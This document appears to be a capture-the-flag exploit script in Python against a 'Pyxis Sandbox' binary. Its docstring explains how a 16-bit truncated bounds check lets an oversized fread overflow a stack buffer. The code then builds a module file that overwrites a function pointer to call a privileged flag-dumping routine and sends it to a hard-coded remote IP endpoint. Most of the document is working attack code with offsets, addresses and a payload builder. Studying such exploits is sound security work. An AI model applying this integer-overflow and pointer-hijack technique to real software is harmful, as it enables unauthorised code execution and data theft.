#!/usr/bin/env python3
"""
Pyxis Sandbox exploit - integer truncation leading to stack overflow /
function pointer hijack -> privileged_telemetry_dump() -> prints $FLAG.

Vulnerability (from disassembly of pyxis-engine, main @ 0x401714):

  Module header (first 12 bytes read via fread):
    offset 0x00: magic   u32 LE  (must == 0x53585950, i.e. "PYXS")
    offset 0x04: count   u16 LE
    offset 0x06: stride  u16 LE
    offset 0x08: flags/pad u32 (unused)

  Bounds check (main+0x1a3 .. main+0x206):
    truncated_product (u16)  = (u16)(count * stride)      // stored in a WORD
    full_product      (u32)  = (u32)count * (u32)stride   // separate imul, zero-extended operands, stored in a DWORD
    if truncated_product > 0x100: reject ("Module memory limit exceeded")
    else: fread(buf, 1, full_product, file)   // buf is a 0x128-byte stack struct!

  Because the check tests the 16-bit-truncated product but the actual fread()
  size is the full 32-bit product, any count/stride pair whose product is a
  multiple of 0x10000 plus something <=0x100 passes the check while the real
  fread() size is >= 0x10000 (65536) bytes, into a stack buffer that is only
  0x128 (296) bytes (sub rsp,0x160 frame). This smashes:
    buf+0x100..0x108          -> a function pointer, normally 
                                  (just printf's "%s" on the input buffer)
    buf+0x108..0x128          -> 0x20 bytes copied in from "stream_default"
                                  string, otherwise mostly padding
    beyond buf+0x128          -> saved registers / return address / FILE*

  main() calls this function pointer unconditionally near the end:
    4019b7: mov rax, [rbp-0x50]      ; the function pointer slot
    4019bb: test rax, rax
    4019c0: mov rax, [rbp-0x50]
    4019d5: call rax

  There is also a second, unauthenticated-looking function already present
  in the binary: privileged_telemetry_dump() @ 0x4016af. It does:
    getenv("FLAG") (defaulting to "ctf7{mock_default_flag}" if unset)
    printf("[+] PRIVILEGED DIAGNOSTIC DUMP: %s\n", flag)
    exit(0)
  This is exactly the gated "diagnostic dump" the challenge page references.

  Exploit: craft count=16, stride=4096 (product = 65536 = 0x10000, whose
  low 16 bits are 0, passing the <=0x100 check), but make the ACTUAL file
  shorter than 65536 bytes -- fread() does a short read of only the bytes
  actually present in the file rather than touching/faulting the whole
  requested length. This lets us write exactly up through offset 0x108
  (the function pointer) without touching anything past it (e.g. the
  separate FILE* at [rbp-0x8], which sits further up the frame and would
  otherwise get corrupted and crash fclose()).

  Payload body (after the 12-byte header):
    0x100 bytes of filler
    8 bytes: the address of privileged_telemetry_dump (0x4016af), little-endian

  main() then calls that address instead of standard_handler, which prints
  getenv("FLAG") and exits.
"""
import json
import urllib.request
import struct

MAGIC = b"PYXS"
COUNT = 16
STRIDE = 4096  # product = 65536 (0x10000); low 16 bits = 0 <= 0x100, bypasses the check
TELEMETRY_DUMP_ADDR = 0x4016af

def build_module():
    header = MAGIC + struct.pack("<HH", COUNT, STRIDE) + b"\x00\x00\x00\x00"
    filler = b"B" * 0x100
    target = struct.pack("<Q", TELEMETRY_DUMP_ADDR)
    body = filler + target  # 0x108 bytes; file intentionally ends here (short read)
    return header + body

def main():
    module = build_module()
    hex_payload = module.hex()
    print("module hex:", hex_payload)

    req = urllib.request.Request(
        "http://91.99.207.116:16354/api/module/run",
        data=json.dumps({"module": hex_payload}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=20) as resp:
        print(resp.status)
        print(resp.read().decode())

if __name__ == "__main__":
    main()
